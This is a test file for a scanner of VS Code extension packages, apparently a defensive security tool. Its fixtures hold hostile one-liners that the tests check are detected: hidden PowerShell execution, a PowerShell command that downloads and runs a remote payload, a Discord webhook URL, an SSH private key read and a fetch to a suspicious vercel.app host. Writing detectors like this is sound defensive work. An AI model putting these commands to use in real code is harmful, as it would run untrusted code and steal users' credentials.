import { describe, expect, it } from "vitest";
import type { VsixContents, VsixManifest } from "../types.js";
import { checkAllPatterns, checkPatterns } from "./patterns.js";

function makeContents(files: Record<string, string>): VsixContents {
  const manifest: VsixManifest = {
    name: "test",
    publisher: "test",
    version: "1.0.0",
  };

  const fileMap = new Map<string, Buffer>();
  for (const [name, content] of Object.entries(files)) {
    fileMap.set(name, Buffer.from(content));
  }

  return {
    manifest,
    files: fileMap,
    basePath: "/test",
  };
}

describe("checkPatterns", () => {
  it("detects hidden PowerShell execution", () => {
    const contents = makeContents({
      "extension.js": `exec('powershell -WindowStyle Hidden -Command "test"')`,
    });

    const findings = checkPatterns(contents);
    expect(findings.some((f) => f.id === "POWERSHELL_HIDDEN")).toBe(true);
  });

  it("detects PowerShell download and execute", () => {
    const contents = makeContents({
      "extension.js": `exec('powershell irm https://example.com/payload | iex')`,
    });

    const findings = checkPatterns(contents);
    expect(findings.some((f) => f.id === "POWERSHELL_DOWNLOAD_EXEC")).toBe(true);
  });

  it("detects Discord webhook URLs", () => {
    const contents = makeContents({
      "extension.js": `const webhook = 'https://discord.com/api/webhooks/123/abc-def'`,
    });

    const findings = checkPatterns(contents);
    expect(findings.some((f) => f.id === "DISCORD_WEBHOOK")).toBe(true);
  });

  it("detects SSH key access", () => {
    const contents = makeContents({
      "extension.js": `const key = fs.readFileSync('.ssh/id_rsa')`,
    });

    const findings = checkPatterns(contents);
    expect(findings.some((f) => f.id === "SSH_KEY_ACCESS")).toBe(true);
  });

  it("detects child_process exec calls", () => {
    const contents = makeContents({
      "extension.js": `const { exec } = require('child_process'); exec('whoami')`,
    });

    const findings = checkPatterns(contents);
    expect(findings.some((f) => f.id === "REQUIRE_CHILD_PROCESS")).toBe(true);
  });

  it("detects Vercel app domains", () => {
    const contents = makeContents({
      "extension.js": `fetch('https://suspicious-payload.vercel.app/data')`,
    });

    const findings = checkPatterns(contents);
    expect(findings.some((f) => f.id === "VERCEL_APP")).toBe(true);
  });

  it("does not flag clean code", () => {
    const contents = makeContents({
      "extension.js": `
        const vscode = require('vscode');
        function activate(context) {
          console.log('Extension activated');
        }
        module.exports = { activate };
      `,
    });

    const findings = checkPatterns(contents);
    expect(findings.filter((f) => f.severity === "critical" || f.severity === "high")).toHaveLength(
      0,
    );
  });
});

describe("checkAllPatterns", () => {
  it("detects native binary files", () => {
    const contents = makeContents({
      "native.node": "binary content",
      "lib.dll": "binary content",
    });

    const findings = checkAllPatterns(contents);
    expect(findings.filter((f) => f.id === "NATIVE_BINARY")).toHaveLength(2);
  });
});
